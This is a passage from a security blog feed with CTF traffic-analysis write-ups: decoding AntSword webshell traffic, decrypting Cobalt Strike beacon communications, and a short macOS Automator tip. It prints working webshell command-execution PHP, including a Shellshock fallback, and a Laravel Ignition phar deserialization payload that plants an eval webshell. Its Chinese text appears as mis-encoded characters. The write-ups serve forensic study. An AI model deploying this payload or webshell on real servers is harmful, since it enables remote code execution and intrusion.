class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span class="line">$d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">if(empty($d)) &#123;</span><br><span class="line">$d&#x3D;array();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d));</span><br><span class="line">&#125;</span><br><span class="line">return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runshellshock($d, $c) &#123;</span><br><span class="line">if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123;</span><br><span class="line">if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123;</span><br><span class="line">$tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;);</span><br><span class="line">putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">if (fe(&#39;error_log&#39;)) &#123;</span><br><span class="line">error_log(&quot;a&quot;, 1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">$output &#x3D; @file_get_contents($tmp);</span><br><span class="line">@unlink($tmp);</span><br><span class="line">if ($output !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">print($output);</span><br><span class="line">return True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return False;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function runcmd($c) &#123;</span><br><span class="line">$ret&#x3D;0;</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if(fe(&#39;system&#39;)) &#123;</span><br><span class="line">@system($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;passthru&#39;)) &#123;</span><br><span class="line">@passthru($c,$ret);</span><br><span class="line">&#125; elseif(fe(&#39;shell_exec&#39;)) &#123;</span><br><span class="line">print(@shell_exec($c));</span><br><span class="line">&#125; elseif(fe(&#39;exec&#39;)) &#123;</span><br><span class="line">@exec($c,$o,$ret);</span><br><span class="line">print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">&#125; elseif(fe(&#39;popen&#39;)) &#123;</span><br><span class="line">$fp&#x3D;@popen($c,&#39;r&#39;);</span><br><span class="line">while(!@feof($fp)) &#123;</span><br><span class="line">print(@fgets($fp,2048));</span><br><span class="line">&#125;</span><br><span class="line">@pclose($fp);</span><br><span class="line">&#125; elseif(fe(&#39;proc_open&#39;)) &#123;</span><br><span class="line">$p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io);</span><br><span class="line">while(!@feof($io[1])) &#123;</span><br><span class="line">print(@fgets($io[1],2048));</span><br><span class="line">&#125;</span><br><span class="line">while(!@feof($io[2])) &#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>We can see that parameter s receive  parameter ufbd335828f30fâ€™s value.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>so, s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by  <a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a>.</p><p><img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image"></p><p>From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field.</p><p><img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image"></p><p>From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beaconâ€™s task execution results from the pacakage which POST DATA to submit.php?id=xxx.</p><p><img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"></p><p>Note that data should be base64 format,then use script decode it.</p><p><img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image"></p><p>So beaconâ€™s task execution result were shown in above figure, it contains the flag what we want.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a></p><p><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a></p><p><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Target: &lt;strong&gt;FIND THE FLAG(</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Quick start  Captfencoder in Mac</title>
    <link href="https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/"/>
    <id>https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/</id>
    <published>2021-10-08T07:35:41.000Z</published>
    <updated>2021-10-09T02:44:06.623Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>Automator in mac<br>open automator,choose application,search shell on the top<br><img src="http://cdn.polowong.top/1633678583273wpowfu9o.png?imageslim" alt="paste image"><br>then type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start</span><br></pre></td></tr></table></figure><p>Automator doesnâ€™t know the path of npm, so it should be exported frist.<br><img src="http://cdn.polowong.top/1633678772412ykmrga69.png?imageslim" alt="paste image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tools&quot;&gt;&lt;a href=&quot;#Tools&quot; class=&quot;headerlink&quot; title=&quot;Tools&quot;&gt;&lt;/a&gt;Tools&lt;/h1&gt;&lt;p&gt;Automator in mac&lt;br&gt;open automator,choose application,sear</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç»¿åŸæ¯æµé‡åˆ†æ</title>
    <link href="https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-10-07T02:33:09.000Z</published>
    <updated>2021-10-07T13:25:07.241Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜æŒºæœ‰æ„æ€çš„ï¼Œè¿˜æ˜¯æŒ‰æµé‡åˆ†æçš„æ€è·¯æ¥åšï¼Œä¸ªäººä¹ æƒ¯å…ˆçœ‹poståŒ…<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">åœ¨è¿™é‡Œçœ‹åˆ°äº†å¾ˆå¤šignitionä¹‹ç±»çš„åŒ…ï¼Œç™¾åº¦äº†ä¸‹è¿™æ˜¯ä¸€ä¸ªlaravelçš„RCEã€‚åé¢çš„åŒ…ä¸€ç›´åœ¨å‘.config.php postæ•°æ®ï¼Œæ€€ç–‘config.phpæ˜¯å†™çš„é©¬ï¼Œè·Ÿè¿›å»çœ‹çœ‹ã€‚ä½¿ç”¨http contains configè¿‡æ»¤å‡ºæ¥ã€‚<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">å¾ˆæ˜æ˜¾æ˜¯webshelläº†ï¼Œè¿™æ˜¯åœ¨æ‰§è¡Œls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">ç»§ç»­è·Ÿè¸ªè¿™ä¸ªwebshellçš„æ•°æ®åŒ…ï¼Œçœ‹çœ‹æœ‰æ— æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">çœ‹åˆ°äº†ä¸€ä¸ªsecret.zipï¼Œä½†æ˜¯httpå¯¹è±¡å¯¼å‡ºå¹¶æ²¡æœ‰è¿™ç©æ„ã€‚ç»§ç»­è¿½è¸ªçœ‹åˆ°äº†pkå¼€å¤´çš„ä¸€æ®µæ•°æ®ï¼Œè€ƒè™‘æ˜¯å‹ç¼©åŒ…ï¼Œå°è¯•è¿›è¡Œè¿˜åŸã€‚<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‹ç¼©åŒ…å‰åæœ‰ä¸¤æ®µå­—ç¬¦ä¸²æ˜¯èšå‰‘è‡ªå¸¦å¹²æ‰°æµé‡ç‰¹å¾çš„ã€‚è¿˜åŸä¹‹åæ˜¯ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œä¸æ˜¯ä¼ªåŠ å¯†ï¼Œä¸‹ä¸€æ­¥çš„ç›®çš„æ˜¯æ‰¾åˆ°å‹ç¼©åŒ…çš„å¯†ç ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ–‡ä»¶åå’Œcobalt strikeæœ‰å…³ï¼ˆrtåºŸç‰©ç‹‚å–œï¼‰ï¼Œç„¶åæœäº†ä¸‹.cobaltstrike.beacon_keysè¿™ä¸ªä¸œè¥¿æ˜¯å¹²å˜›çš„ã€‚ä¸Šè¿°æ–‡ä»¶æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å…¬é’¥ç§é’¥æ–‡ä»¶ï¼ŒCSçš„beaconä¼šåµŒå…¥è¿™ä¸ªæ–‡ä»¶ä¸­çš„å…¬é’¥ï¼Œå½“ç„¶äº†ï¼Œç§é’¥æ˜¯ç•™ç»™serverè‡ªå·±çš„ã€‚ä¸‹ä¸€æ­¥åº”è¯¥æ˜¯å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè§£å¯†ï¼Œè·å–CSçš„é€šä¿¡æ•°æ®ã€‚æ—¢ç„¶çŸ¥é“äº†æ˜¯cobalt strikeçš„é€šä¿¡æµé‡ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾åˆ°beaconä¸teamserveräº¤äº’çš„æ•°æ®åŒ…ï¼Œä½†è¿™ä¸ªå‰ææ˜¯å¾—åˆ°ç§é’¥ã€‚è·å–ç§é’¥çš„å‰ææ˜¯è§£å¼€å‹ç¼©åŒ…çš„å¯†ç ã€‚ä¸‹é¢éœ€è¦åšçš„æ˜¯æ‰¾å‹ç¼©åŒ…çš„å¯†ç ã€‚<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">ç»§ç»­è¿½è¸ªæ•°æ®åŒ…ï¼Œåœ¨ä¸Šé¢çš„åŒ…ä¸­çœ‹åˆ°äº†è§£å‹çš„æ“ä½œã€‚ä½†æ˜¯å½“æ—¶æˆ‘ç›´æ¥å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡ŒURL+BASE64è§£ç ï¼Œå¹¶ä¸èƒ½å¾—åˆ°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„æ˜¯çœ‹ä¸€çœ‹ä¼ çš„é©¬çš„å†…å®¹ä»¥åŠåŠ å¯†æ–¹å¼ã€‚åœ¨laravel RCEçš„åŒ…ä¸­å¯ä»¥æ‰¾åˆ°payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>æŠŠpayloadä¸­çš„=00æ›¿æ¢ä¸ºç©ºç„¶åè§£base64å¯ä»¥å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">ï¿½a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~Ø¶test.txt\KKa~Ø¶testtest6z&#x3D;Jcï¿½Fï¿½ï¿½ØİŒ&amp;~ï¿½&lt;@ï¿½ï¿½GBMB</span><br></pre></td></tr></table></figure><p>è¿™å†™è¿›å»çš„åº”è¯¥æ˜¯ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼Œåº”è¯¥æ˜¯å’Œlaravelçš„rceæœ‰å…³ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¼ è¿›å»çš„å†…å®¹ã€‚@eval(@gzinflate(base64_decode($_POST[14433])));æ‰€ä»¥éœ€è¦åšgzipå’Œbase64çš„è§£ç æ‰å¯ä»¥æ˜ç™½æµé‡åŒ…ä¸­çš„å…·ä½“å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 